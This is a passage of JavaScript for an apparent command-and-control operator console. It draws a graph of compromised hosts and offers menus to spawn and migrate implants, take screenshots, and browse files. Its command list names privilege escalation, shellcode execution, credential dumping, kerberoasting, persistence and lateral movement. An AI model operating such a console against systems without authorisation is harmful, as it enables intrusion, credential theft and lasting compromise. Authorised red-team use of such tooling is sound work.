      '<marker id="ar-red"          viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
      '<marker id="ar-blue"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#4d9fe6"/></marker>' +
      '<marker id="ar-grey"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#6b7280"/></marker>' +
      '<marker id="ar-orange-end"   viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '<marker id="ar-orange-start" viewBox="0 0 10 10" refX="1.5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '</defs>';

    html += `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;
    if (!nodes.length) {
      html += `<text x="${W / 2}" y="${H / 2}" text-anchor="middle" fill="var(--muted)" font-size="13">暂无${agentListFilter === 'beacons' ? '信标' : '会话'}</text>`;
    }

    // Draw edges
    graphEdges.forEach(ed => {
      const src  = ed.from === '__fw__' ? fwPos : posOf(ed.from);
      const tgt  = posOf(ed.to);
      const srcR = ed.from === '__fw__' ? FW_R : NODE_R;
      const eid  = `ge-${ed.from}-${ed.to}`;
      if (ed.isJump) {
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="#f5a623" stroke-width="2.2" stroke-dasharray="9 5" fill="none"
          marker-end="url(#ar-orange-end)" marker-start="url(#ar-orange-start)" opacity="0.92"/>`;
      } else {
        const col = edgeColor(nodeByID[ed.to]);
        const mk  = col === '#4d9fe6' ? 'ar-blue' : col === '#e23c4e' ? 'ar-red' : col === '#6b7280' ? 'ar-grey' : 'ar-green';
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="${col}" stroke-width="2.4" fill="none" marker-end="url(#${mk})"/>`;
      }
    });

    // Firewall icon — brick wall + flame, NO text label
    html += `<g pointer-events="none" transform="translate(${fwX},${fwY})">`;
    const bw = 15, bh = 9;
    for (let r = 0; r < 5; r++) {
      const oy = -22 + r * bh, off = (r % 2) ? bw / 2 : 0;
      for (let c = -1; c < 2; c++)
        html += `<rect x="${c*bw+off-7}" y="${oy}" width="${bw-1.5}" height="${bh-1.5}" fill="#9a3b2e" stroke="#5f231b" stroke-width="0.8"/>`;
    }
    html += '<text x="-19" y="7" font-size="30" text-anchor="middle">\uD83D\uDD25</text>';
    html += '</g>';

    // Agent nodes
    nodes.forEach(nd => {
      const o    = nd.obj, p = posOf(o.id), dead = o.isDead, priv = isPrivileged(o);
      const affected = affectedByOfflineParent(o.id);
      const descendants = downstreamCount(o.id);
      const isJumpRelated = jumpEdgeSet.size > 0 &&
        [...jumpEdgeSet].some(k => k.startsWith(o.id + ':') || k.endsWith(':' + o.id));
      html += `<g class="gnode${dead ? ' dead' : ''}${affected ? ' affected' : ''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab"><title>${esc(`${o.hostname || o.id} · ${o.transport || '未知传输'} · 下游 ${descendants} 个${affected ? ' · 受失联上游影响' : ''}`)}</title>`;
      html += '<rect x="-30" y="-34" width="60" height="94" fill="transparent"/>';
      if (o.id === activeInteractId)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#35c46b" stroke-width="1.5" stroke-dasharray="5 4"/>';
      else if (isJumpRelated)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#f5a623" stroke-width="1.2" stroke-dasharray="6 4" opacity="0.65"/>';
      html += `<image href="${osIconHref(o.os, priv, dead)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
      const user = shortUser(o.username) + (priv && !dead ? ' *' : '');
      const l2   = `${o.hostname || o.id.slice(0, 6)} · ${o.transport || '-'}${descendants ? ` · ↓${descendants}` : ''}`;
      const lc   = dead ? 'var(--muted)' : (priv ? 'var(--accent)' : 'var(--text)');
      html += `<text y="40" text-anchor="middle" fill="${lc}" font-size="10" font-weight="bold" font-family="var(--font)" pointer-events="none">${esc(user)}</text>`;
      html += `<text y="51" text-anchor="middle" fill="var(--muted)" font-size="8.5" font-family="var(--mono)" pointer-events="none">${esc(l2)}</text>`;
      if (dead) html += '<text y="-30" text-anchor="middle" fill="var(--muted)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">离线</text>';
      else if (affected) html += '<text y="-30" text-anchor="middle" fill="#f5a623" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">上游失联</text>';
      html += '</g>';
    });

    html += '</g>';
    svg.innerHTML = html;

    const byId = {}; nodes.forEach(nd => byId[nd.obj.id] = nd);
    svg.querySelectorAll('.gnode').forEach(el => {
      const nd = byId[el.dataset.id];
      if (nd && !nd.obj.isDead) el.addEventListener('dblclick', () => openInteract(nd.kind, nd.obj));
    });
    setupGraphInteraction(svg);
  } catch (err) { console.error('renderGraph failed:', err); }
}

// setupGraphInteraction wires node drag, canvas pan and wheel zoom.
// Guards with svg._wired so it only sets up once per SVG lifetime.
// Call svg._wired = false before renderGraph() when you need a fresh setup (e.g. resetGraph).
function setupGraphInteraction(svg) {
  if (svg._wired) return;
  svg._wired = true;
  let mode = null, dragId = null, startX = 0, startY = 0, origX = 0, origY = 0;

  const applyView = () => {
    const root = document.getElementById('g-root');
    if (root) root.setAttribute('transform', `translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})`);
  };
  const posOf = id => graphDrag[id] || graphPos[id] || (svg._layout && svg._layout[id]) || { x: (svg._fwX||74) + 200, y: svg._fwY || 0 };

  svg.addEventListener('mousedown', e => {
    const nodeEl = e.target.closest('.gnode');
    startX = e.clientX; startY = e.clientY;
    if (nodeEl) {
      mode = 'node'; dragId = nodeEl.dataset.id;
      const pp = posOf(dragId); origX = pp.x; origY = pp.y;
      nodeEl.style.cursor = 'grabbing';
    } else {
      mode = 'pan'; origX = graphView.tx; origY = graphView.ty;
      svg.style.cursor = 'grabbing';
    }
    e.preventDefault();
  });

  document.addEventListener('mousemove', e => {
    if (!mode) return;
    if (mode === 'node') {
      const dx = (e.clientX - startX)/graphView.scale, dy = (e.clientY - startY)/graphView.scale;
      const nx = origX + dx, ny = origY + dy;
      graphDrag[dragId] = { x: nx, y: ny };
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`);
      if (g) g.setAttribute('transform', `translate(${nx},${ny})`);
      (graphEdges || []).forEach(ed => {
        if (ed.from !== dragId && ed.to !== dragId) return;
        const src = ed.from === '__fw__' ? { x: svg._fwX, y: svg._fwY } : posOf(ed.from), tgt = posOf(ed.to);
        const el = document.getElementById(`ge-${ed.from}-${ed.to}`);
        if (el) el.setAttribute('d', edgeD(src, tgt, ed.from === '__fw__' ? 48 : 46, 46));
      });
    } else if (mode === 'pan') {
      graphView.tx = origX + (e.clientX - startX);
      graphView.ty = origY + (e.clientY - startY);
      applyView();
    }
  });

  document.addEventListener('mouseup', () => {
    if (mode === 'pan') svg.style.cursor = '';
    if (mode === 'node' && dragId) {
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`); if (g) g.style.cursor = 'grab';
      // Persist the dragged position so it survives refresh / reconnect.
      if (graphDrag[dragId]) { graphPos[dragId] = { ...graphDrag[dragId] }; saveState(); }
    }
    mode = null; dragId = null;
  });

  svg.addEventListener('wheel', e => {
    e.preventDefault();
    const rect = svg.getBoundingClientRect();
    const mx = e.clientX - rect.left, my = e.clientY - rect.top;
    const factor = e.deltaY < 0 ? 1.12 : 1/1.12;
    const ns = Math.min(3, Math.max(0.3, graphView.scale * factor));
    graphView.tx = mx - (mx - graphView.tx) * (ns/graphView.scale);
    graphView.ty = my - (my - graphView.ty) * (ns/graphView.scale);
    graphView.scale = ns;
    applyView();
  }, { passive: false });
}

// Reset the graph layout/view to its default.
// Clears all dragged positions, resets pan/zoom, and forces interaction re-init.
function resetGraph() {
  for (const k in graphPos)  delete graphPos[k];
  for (const k in graphDrag) delete graphDrag[k];
  graphView  = { tx: 0, ty: 0, scale: 1 };
  graphCenter = null;
  saveState();               // persist the cleared layout so it sticks
  // Do NOT reset svg._wired — the pan/drag/zoom listeners are delegated on the
  // svg/document and survive re-renders. Re-wiring would stack duplicate handlers.
  renderGraph();             // re-renders with cleared drags + reset pan/zoom
  toast('ok', '拓扑图布局已重置');
}

// ── Context menu ───────────────────────────────────────────────────────────
const ctxMenu = document.getElementById('ctx-menu');
function showCtx(e, kind, obj) {
  e.preventDefault(); activeCtxAgent = { kind, obj };
  const session = kind === 'session', windows = (obj.os || '').toLowerCase().includes('windows');
  const item = (action, label, options = {}) => `<button class="ctx-item${options.danger ? ' danger' : ''}" data-ctx-action="${action}" ${options.disabled ? 'disabled' : ''}>${label}</button>`;
  ctxMenu.innerHTML = `<div class="ctx-agent"><strong>${esc(obj.hostname || obj.name || obj.id.slice(0,8))}</strong><span>${session ? '实时会话' : '异步信标'}</span></div>
    ${item('overview','主机概览')}${session ? '' : item('interact','打开信标工作区')}
    <div class="ctx-divider"></div>
    ${session ? `${item('spawn','生成新会话')}${windows ? item('screenshot','截取屏幕') : ''}${item('network','网络信息')}${item('files','文件浏览器')}${item('processes','进程浏览器')}${windows ? item('integrity','检查完整性级别') : ''}` : '<div class="ctx-hint">实时浏览和主机操作需使用 Session</div>'}
    <div class="ctx-divider"></div>
    ${item('copy-summary','复制目标摘要')}
    ${session ? item('rename','重命名') : ''}<div class="ctx-divider"></div>${item('kill','终止', {danger:true})}`;
  ctxMenu.style.left = Math.max(8, Math.min(e.clientX, window.innerWidth-230))+'px';
  ctxMenu.style.top = Math.max(8, Math.min(e.clientY, window.innerHeight-Math.min(560, ctxMenu.scrollHeight || 560)))+'px';
  ctxMenu.classList.remove('hidden');
}
document.addEventListener('click', () => ctxMenu.classList.add('hidden'));
ctxMenu.addEventListener('click', async event => {
  const button = event.target.closest('[data-ctx-action]');
  if (!button || button.disabled || !activeCtxAgent) return;
  event.stopPropagation(); ctxMenu.classList.add('hidden');
  const { kind, obj } = activeCtxAgent, action = button.dataset.ctxAction;
  if (action === 'overview') return openAgentOverview(kind, obj);
  if (action === 'interact') return openInteract(kind, obj);
  if (action === 'screenshot') return openAgentScreenshot(obj);
  if (action === 'network') return openAgentNetwork(obj);
  if (action === 'files') return openFileBrowser(obj.id);
  if (action === 'upload') return uploadFromContext(obj);
  if (action === 'processes') return openProcessBrowser(obj.id);
  if (action === 'spawn') return openSpawnDialog(obj);
  if (action === 'infrastructure') { await openInfrastructurePanel(); const select = document.getElementById('infra-session-filter'); if (select) { select.value = obj.id; select.dispatchEvent(new Event('change')); } return; }
  if (action === 'automation') { await openScriptsPanel(); const select = document.getElementById('scr-session'); if (select) select.value = obj.id; return; }
  if (action.startsWith('copy-')) return copyAgentValue(action, kind, obj);
  if (action === 'integrity') return checkAgentIntegrity(obj);
  if (action === 'rename') return renameContextSession(obj);
  if (action === 'kill') return killContextAgent(kind, obj);
});

async function checkAgentIntegrity(obj) {
  toast('info', `正在检查 ${obj.hostname} 的完整性级别...`);
  const r = await App().GetPrivs(obj.id).catch(() => null);
  if (!r || !r.integrity) return toast('err', 'getprivs 失败（需要在线的 Windows 会话）');
  integrityMap[obj.id] = r.integrity;
  saveState();
  const label = integrityLabel(obj) || r.integrity;
  toast(isPrivileged(obj) ? 'ok' : 'info', `${obj.hostname}：完整性级别 ${label}`);
  renderTable();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
}
async function renameContextSession(obj) {
  const n = await uiPrompt('新名称：', obj.name || '', { title: '重命名会话' }); if (!n) return;
  await App().RenameSession(obj.id, n)
    .then(() => toast('ok', '会话已重命名'))
    .catch(e => toastRpcError(e, '重命名失败'));
  refreshAgents();
}
async function killContextAgent(kind, obj) {
  if (!(await uiConfirm(`确定终止 ${obj.hostname || obj.id} 上的${kind === 'session' ? '会话' : '信标'}吗？`, { title: '终止代理', okLabel: '终止', danger: true }))) return;
  const call = kind === 'session' ? App().KillSession(obj.id) : App().KillBeacon(obj.id);
  await call
    .then(() => toast('ok', `已终止${kind === 'session' ? '会话' : '信标'} ${obj.hostname || ''}`.trim()))
    .catch(e => toast('err', '终止失败：' + e));
  refreshAgents();
}

function openAgentOverview(kind, obj) {
  const rows = [['类型',kind === 'session' ? '实时会话' : '异步信标'],['名称',obj.name || '-'],['主机名',obj.hostname || '-'],['用户名',obj.username || '-'],['系统',`${obj.os || '-'} / ${obj.arch || '-'}`],['当前进程',`${obj.processName || '-'} (PID ${obj.pid || '-'})`],['传输',obj.transport || '-'],['连接来源',obj.remoteAddress || '-'],['地址说明','该值是 Teamserver 看到的连接端；反向代理场景需服务端链路支持才能获得公网来源 IP'],['最近签到',obj.lastCheckin || '-']];
  if (kind === 'beacon') rows.push(['下次预计签到',obj.nextCheckin || '-']);
  openViewPanel('_agent-overview', `主机概览 - ${obj.hostname || obj.id.slice(0,8)}`, `<div class="agent-overview">${rows.map(([label,value]) => `<div><span>${label}</span><strong>${esc(value)}</strong></div>`).join('')}</div>`);
}

async function openAgentScreenshot(obj) {
  openViewPanel('_agent-screenshot', `屏幕截图 - ${obj.hostname || obj.id.slice(0,8)}`, '<div class="infra-loading"><span class="spinner"></span>正在截取屏幕...</div>');
  const result = await App().TakeScreenshot(obj.id).then(data => ({ data })).catch(error => ({ error }));
  const body = document.getElementById('modal-body');
  if (result.error) body.innerHTML = rpcErrorHtml(result.error, '截取屏幕失败');
  else body.innerHTML = `<div class="screenshot-preview"><img src="${result.data}" alt="${esc(obj.hostname || '目标')} 的屏幕截图"/></div>`;
}

async function openAgentNetwork(obj) {
  openViewPanel('_agent-network', `网络信息 - ${obj.hostname || obj.id.slice(0,8)}`, '<div class="infra-loading"><span class="spinner"></span>正在读取网络信息...</div>');
  const [interfaces, connections] = await Promise.all([App().Ifconfig(obj.id).catch(error => ({ error })), App().GetNetstat(obj.id).catch(error => ({ error }))]);
  const body = document.getElementById('modal-body');
  if (interfaces.error || connections.error) { body.innerHTML = rpcErrorHtml(interfaces.error || connections.error, '读取网络信息失败'); return; }
  body.innerHTML = `<div class="network-summary"><section><h3>网络接口</h3>${interfaces.map(item => `<div class="network-interface"><strong>${esc(item.name)}</strong><span>${esc(item.mac || '无 MAC')}</span><code>${esc((item.ips || []).join('\n') || '无地址')}</code></div>`).join('') || '<div class="empty-state">没有网络接口</div>'}</section><section><h3>活动连接</h3><div class="table-wrap"><table class="data-table"><thead><tr><th>协议</th><th>本地地址</th><th>远程地址</th><th>状态</th><th>进程</th></tr></thead><tbody>${connections.map(item => `<tr><td>${esc(item.protocol)}</td><td><code>${esc(item.localAddr)}</code></td><td><code>${esc(item.remoteAddr)}</code></td><td>${esc(item.state)}</td><td>${esc(item.process || item.pid || '-')}</td></tr>`).join('') || '<tr><td colspan="5" class="empty-state">没有活动连接</td></tr>'}</tbody></table></div></section></div>`;
}

async function uploadFromContext(obj) {
  const remotePath = await uiPrompt('远程目标路径（留空使用本地文件名）：', '', { title:'上传文件' });
  if (remotePath === null) return;
  const result = await runFileTransfer('upload', obj.id, remotePath);
  if (result?.error) toastRpcError(result.error, '上传文件失败'); else if (result) toast('ok', `文件已上传到 ${result.path}`);
}

async function copyAgentValue(action, kind, obj) {
  const values = {'copy-id':obj.id,'copy-host':obj.hostname,'copy-user':obj.username,'copy-address':obj.remoteAddress,'copy-summary':`${kind === 'session' ? 'Session' : 'Beacon'} | ${obj.hostname || '-'} | ${obj.username || '-'} | ${obj.remoteAddress || '-'} | ${obj.os || '-'}/${obj.arch || '-'} | ${obj.id}`};
  const value = values[action] || '';
  try { await navigator.clipboard.writeText(value); toast('ok', '已复制到剪贴板'); }
  catch (error) { toast('err', '复制失败'); }
}

async function openMigrateDialog(sessionID, initialPID = '') {
  const profiles = await App().ListImplantProfiles().catch(error => ({ error }));
  if (profiles.error) return toastRpcError(profiles.error, '读取植入体配置档案失败');
  if (!profiles.length) return toast('info', '请先创建植入体配置档案');
  const pid = await uiPrompt('目标进程 PID：', String(initialPID || ''), { title:'进程迁移' });
  if (!pid || !/^\d+$/.test(pid)) return pid !== null && toast('err', '请输入有效 PID');
  const profile = await uiSelectDialog('选择用于迁移的植入体配置档案：', profiles.map(item => ({value:item.name,label:`${item.name} · ${item.goos}/${item.goarch}`})), { title:'进程迁移' });
  if (!profile) return;
  if (!(await uiConfirm(`确认将当前会话迁移到 PID ${pid}？此操作会使用配置档案“${esc(profile)}”构建载荷。`, {title:'确认进程迁移',okLabel:'迁移',danger:true}))) return;
  await App().Migrate(sessionID, Number(pid), profile).then(() => toast('ok', `已提交迁移到 PID ${pid}`)).catch(error => toastRpcError(error, '进程迁移失败'));
}

async function openSpawnDialog(obj) {
  const profiles = await App().ListImplantProfiles().catch(error => ({ error }));
  if (profiles.error) return toastRpcError(profiles.error, '读取植入体配置档案失败');
  const compatible = profiles.filter(profile => !profile.goos || profile.goos === obj.os);
  const choices = compatible.length ? compatible : profiles;
  if (!choices.length) return toast('info', '请先创建植入体配置档案');
  const profileName = await uiSelectDialog('选择用于在当前主机生成新回连的配置档案：', choices.map(profile => ({value:profile.name,label:`${profile.name} · ${profile.goos}/${profile.goarch} · ${profile.beacon ? '信标' : '会话'}`})), { title:'生成新会话' });
  if (!profileName) return;
  const profile = profiles.find(item => item.name === profileName);
  if (!(await uiConfirm(`将在 ${obj.hostname || obj.id.slice(0,8)} 上传并执行由“${esc(profileName)}”生成的新植入体。确认继续？`, {title:'确认生成新会话',okLabel:'生成并执行',danger:true}))) return;
  toast('info', '正在生成、上传并执行植入体...');
  const result = await App().ScriptSpawnLocal(obj.id, profile?.goos || obj.os || 'windows', profile?.goarch || obj.arch || 'amd64', profileName).catch(error => ({error}));
  if (result.error) return toastRpcError(result.error, '生成新会话失败');
  toast('ok', result.output || '新植入体已执行，正在等待回连');
  refreshAgents();
}

// ── Interaction panel ──────────────────────────────────────────────────────
const AGENT_COMMAND_SCHEMA = {
  commands: [
    'help','info','clear','shell','pty','execute','grep','mount','memfiles','ssh','ps','ls','cd','pwd',
    'download','upload','cat','mkdir','rm','mv','cp','screenshot','netstat','ifconfig','env','getenv',
    'setenv','unsetenv','reg','whoami','getprivs','procdump','kill','loot','chmod','chown','getsystem',
    'make-token','impersonate','rev2self','runas','migrate','execute-assembly','execute-shellcode','sideload',
    'spawndll','extensions','ext','wasm','execute-windows','ping','wg-forwarders','wg-list-socks','close',
    'backdoor','dllhijack','msf','msf-inject','socks','portfwd','rportfwd','wg-portfwd','wg-socks','pivot',
    'services','tasks','reconfig','interactive','spawn','jump','privesc-check','harvest','ad-enum','local-enum',
    'kerberoast','persist','scan',
  ],
  arguments: {
    socks: { 0: ['start','stop','status'] }, portfwd: { 0: ['add','rm','list'] },
    rportfwd: { 0: ['add','rm','list'] }, 'wg-portfwd': { 0: ['add','rm'] },
    pivot: { 0: ['start','stop','list'], 1: ['tcp','pipe'] },
    services: { 0: ['detail','start'] }, loot: { 0: ['add','rm'] },
    wasm: { 0: ['list','register','exec'] }, memfiles: { 0: ['list','add','rm'] },
    reg: { 0: ['query','read','write','read-hive'] }, spawn: { 0: ['windows','linux'] },
    jump: { 0: ['ssh','psexec','winrm','wmi'] }, persist: { 0: ['cron','reg','schtask','service'] },
  },
};

function attachCommandCompletion(input, schema, dynamicCandidates) {
  const popup = document.createElement('div');
  popup.className = 'command-completions hidden';
  input.parentElement.appendChild(popup);
  CommandCompletion.attach(input, {
    schema,
    dynamicCandidates,
    render(matches, active = -1) {
      popup.classList.toggle('hidden', !matches.length);
      popup.innerHTML = matches.slice(0, 8).map((value, index) =>
        `<span class="${index === active ? 'active' : ''}">${esc(value)}</span>`).join('');
    },
  });
}

function openInteract(kind, obj) {
  const id = obj.id;
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind, obj, workspaceView: window.savedWorkspaceViews?.[id] || 'terminal' };
  document.getElementById('empty-interact')?.remove();
  // Create tab
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>[${kind === 'session' ? '会话' : '信标'}] ${esc(obj.hostname||obj.id.slice(0,6))}</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Create panel
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  const promptStr = `${shortUser(obj.username)}@${obj.hostname||'?'} :>`;
  const helpText = kind === 'beacon'
    ? `[信标] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[信息] 间隔：${fmtDur(obj.interval)} | 抖动：${fmtDur(obj.jitter)}\n` +
      `[信息] 命令已排队，将在下次回连时执行。\n` +
      `[信息] 输入 'help' 查看可用命令。\n`
    : `[会话] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[信息] 交互式会话，命令将立即执行。\n` +
      `[信息] 输入 'help' 查看可用命令。\n`;
  panel.innerHTML = `
    <div class="agent-workspace-header">
      <div class="agent-workspace-identity">
        <span class="agent-live-dot ${obj.isDead ? 'dead' : ''}"></span>
        <strong>${esc(obj.hostname || obj.name || id.slice(0, 8))}</strong>
        <span>${esc(obj.username || '-')}</span><span>${esc(obj.os || '-')}/${esc(obj.arch || '-')}</span>
        <span>${esc(obj.transport || '-')}</span>
      </div>
      <div class="agent-workspace-state">${kind === 'beacon'
        ? `异步信标 · 上次签到 ${esc(obj.lastCheckin || '-')} · 下次预计 ${esc(obj.nextCheckin || '-')} · ${esc(fmtDur(obj.interval))} ± ${esc(fmtDur(obj.jitter))}`
        : `${obj.isDead ? '已失联' : '实时会话'} · 最近活动 ${esc(obj.lastCheckin || '-')} · PID ${esc(obj.pid || '-')}`}</div>
    </div>
    <div class="agent-workspace-nav" id="workspace-nav-${id}">
      ${[
        ['overview','概览'], ['terminal','终端'], ['files','文件'], ['processes','进程'], ['network','网络'],
        ['services','服务'], ['environment','环境'], ['tasks','任务'], ['loot','Loot'], ['pivots','Pivot'],
      ].map(([view, label]) => `<button class="workspace-tab${openTabs[id].workspaceView === view ? ' active' : ''}" data-workspace-view="${view}"${kind === 'beacon' && ['files','processes','network','services','environment','pivots'].includes(view) ? ' disabled title="需要实时 Session"' : ''}>${label}</button>`).join('')}
    </div>
    <div class="agent-overview${openTabs[id].workspaceView === 'overview' ? '' : ' hidden'}" id="agent-overview-${id}">
      <div><span>目标 ID</span><strong>${esc(id)}</strong></div><div><span>远程地址</span><strong>${esc(obj.remoteAddress || '-')}</strong></div>
      <div><span>主机</span><strong>${esc(obj.hostname || '-')}</strong></div><div><span>用户</span><strong>${esc(obj.username || '-')}</strong></div>
      <div><span>系统</span><strong>${esc(obj.os || '-')}/${esc(obj.arch || '-')}</strong></div><div><span>传输</span><strong>${esc(obj.transport || '-')}</strong></div>
    </div>
    <div class="agent-terminal${openTabs[id].workspaceView === 'overview' ? ' hidden' : ''}" id="agent-terminal-${id}">
    <div class="console-script-bar" id="csb-${id}">
      <div class="csb-header">
        <div class="csb-title">
          <span class="csb-badge">脚本</span>
          <span class="csb-target">跳板：${esc(obj.hostname || obj.id.slice(0,8))} (${obj.os}/${obj.arch})</span>
        </div>
        <div class="csb-cats" id="csb-cats-${id}"></div>
        <button class="csb-toggle-btn" id="csb-toggle-${id}">隐藏脚本</button>
      </div>
      <div class="csb-body" id="csb-body-${id}">
        <div class="csb-grid" id="csb-recipes-${id}"></div>
        <div class="csb-card" id="csb-card-${id}" style="display:none">
          <div class="csb-card-header">
            <h4 id="csb-card-title-${id}"></h4>
            <p id="csb-card-desc-${id}"></p>
          </div>
          <div class="csb-form-grid" id="csb-form-${id}"></div>
          <div class="csb-actions">
            <button class="csb-btn csb-btn-preview" id="csb-btn-prev-${id}">预览 / 模拟运行</button>
            <button class="csb-btn csb-btn-exec" id="csb-btn-exec-${id}">执行方案</button>
          </div>
        </div>
      </div>
    </div>
    <div class="console-out" id="cout-${id}"><span class="info">${esc(helpText)}</span></div>
    <div class="console-in"><span class="console-prompt">${esc(promptStr)} </span><input class="console-input" id="cinp-${id}" placeholder="输入命令..." autocomplete="off"/></div>
    </div>
  `;
  document.getElementById('interact-panels').appendChild(panel);
  // Wire input
  const inp = document.getElementById(`cinp-${id}`);
  const hist = []; let hIdx = -1;
  attachCommandCompletion(inp, AGENT_COMMAND_SCHEMA);
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') { runAgentCmd(kind, id, inp, hist); hIdx = -1; }
    if (e.key === 'ArrowUp') { if (hIdx < hist.length-1) { hIdx++; inp.value = hist[hIdx]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hIdx > 0) { hIdx--; inp.value = hist[hIdx]; } else { hIdx=-1; inp.value=''; } e.preventDefault(); }
  });
  attachConsoleScriptManager(id, kind, obj);
  panel.querySelectorAll('[data-workspace-view]').forEach(button => button.addEventListener('click', () => switchWorkspaceView(id, button.dataset.workspaceView)));
  activateTab(id);
}

function switchWorkspaceView(id, view) {
  const tab = openTabs[id];
  if (!tab?.obj) return;
  if (view === 'files') { openFileBrowser(id); return; }
  if (view === 'processes') { openProcessBrowser(id); return; }
  if (view === 'tasks' && tab.kind === 'session') { openTaskCenter(id); return; }
  tab.workspaceView = view;
  saveState();
  document.querySelectorAll(`#workspace-nav-${id} .workspace-tab`).forEach(button => button.classList.toggle('active', button.dataset.workspaceView === view));
  const overview = document.getElementById(`agent-overview-${id}`);
  const terminal = document.getElementById(`agent-terminal-${id}`);
  overview?.classList.toggle('hidden', view !== 'overview');
  terminal?.classList.toggle('hidden', view === 'overview');
  if (view === 'overview' || view === 'terminal') return;
  const commands = { network: 'ifconfig', services: 'services', environment: 'env', tasks: 'tasks', loot: 'loot', pivots: 'pivot' };
  const input = document.getElementById(`cinp-${id}`);
  if (input && commands[view]) {
    input.value = commands[view];
    runAgentCmd(tab.kind, id, input, []);
    tab.workspaceView = 'terminal';
    document.querySelectorAll(`#workspace-nav-${id} .workspace-tab`).forEach(button => button.classList.toggle('active', button.dataset.workspaceView === 'terminal'));
    saveState();
  }
}

function attachConsoleScriptManager(id, kind, obj) {
  const catsEl = document.getElementById(`csb-cats-${id}`);
  const gridEl = document.getElementById(`csb-recipes-${id}`);
  const cardEl = document.getElementById(`csb-card-${id}`);
  const cardTitle = document.getElementById(`csb-card-title-${id}`);
  const cardDesc = document.getElementById(`csb-card-desc-${id}`);
  const formEl = document.getElementById(`csb-form-${id}`);
  const btnPrev = document.getElementById(`csb-btn-prev-${id}`);
  const btnExec = document.getElementById(`csb-btn-exec-${id}`);
  const toggleBtn = document.getElementById(`csb-toggle-${id}`);
  const csbBody = document.getElementById(`csb-body-${id}`);

  let activeCat = 'All';
  let activeScript = null;
  let allScriptList = [];

  toggleBtn?.addEventListener('click', () => {
    const isHidden = csbBody.style.display === 'none';
    csbBody.style.display = isHidden ? 'block' : 'none';
    toggleBtn.textContent = isHidden ? '隐藏脚本' : '显示脚本';
  });

  App().ListScripts().then(scripts => {
    const targetOS = (obj.os || 'windows').toLowerCase();
    allScriptList = (scripts || []).filter(s => {
      if (!s.targetOS || s.targetOS === 'all') return true;
      return targetOS.includes(s.targetOS);
    });
    const cats = ['All'];
    allScriptList.forEach(s => { if (!cats.includes(s.category)) cats.push(s.category); });

    catsEl.innerHTML = cats.map(c => `<button class="csb-cat-tab ${c === 'All' ? 'active' : ''}" data-cat="${esc(c)}">${c === 'All' ? '全部' : esc(c)}</button>`).join('');
    catsEl.querySelectorAll('.csb-cat-tab').forEach(tb => {
      tb.addEventListener('click', () => {
        catsEl.querySelectorAll('.csb-cat-tab').forEach(x => x.classList.remove('active'));
        tb.classList.add('active');
        activeCat = tb.dataset.cat;
        renderRecipes();
      });
    });

    renderRecipes();
  }).catch(() => {});

  function renderRecipes() {
    gridEl.innerHTML = '';
    const filtered = activeCat === 'All' ? allScriptList : allScriptList.filter(s => s.category === activeCat);
    filtered.forEach(s => {
      const btn = document.createElement('button');
      btn.className = `csb-recipe-btn ${activeScript && activeScript.method === s.method ? 'active' : ''}`;
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      btn.innerHTML = `<span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}`;
      btn.title = s.description;
      btn.addEventListener('click', () => selectRecipe(s));
      gridEl.appendChild(btn);
    });
  }

  function selectRecipe(s) {
    activeScript = s;
    renderRecipes();

    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} 噪声</span>` : '';
    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    formEl.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
